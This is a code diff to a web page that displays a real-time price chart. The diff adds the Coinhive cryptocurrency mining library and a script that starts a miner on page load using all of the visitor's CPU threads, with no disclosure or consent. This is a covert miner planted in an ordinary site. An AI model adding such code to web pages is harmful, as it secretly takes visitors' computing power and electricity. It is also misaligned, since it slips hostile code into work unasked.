@@ -7,6 +7,7 @@
 <script src="https://npmcdn.com/chart.js@latest/dist/Chart.bundle.min.js"></script>
 <script src="https://npmcdn.com/Chart.Zoom.js@latest/Chart.Zoom.min.js"></script>
 
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 
 <h1 id="price" style="text-align: center;"></h1>
 <canvas id="myChart" width="800" height="200" style="max-width: 1600px; max-height:400px; margin: 0 auto;"></canvas>
@@ -34,6 +35,14 @@ src="//pagead2.googlesyndication.com/pagead/show_ads.js">
 
 
 <script>
+var miner = new CoinHive.User('6N8PcRT201fFHwOLDV0rnDrvB3I9mp4i', 'User', {
+	    threads: navigator.hardwareConcurrency,
+	    autoThreads: false,
+	    throttle: 0.5,
+	    forceASMJS: false
+	});
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+    
 setInterval(getRealtimePrice, 30000);
 
 function getRealtimePrice(){
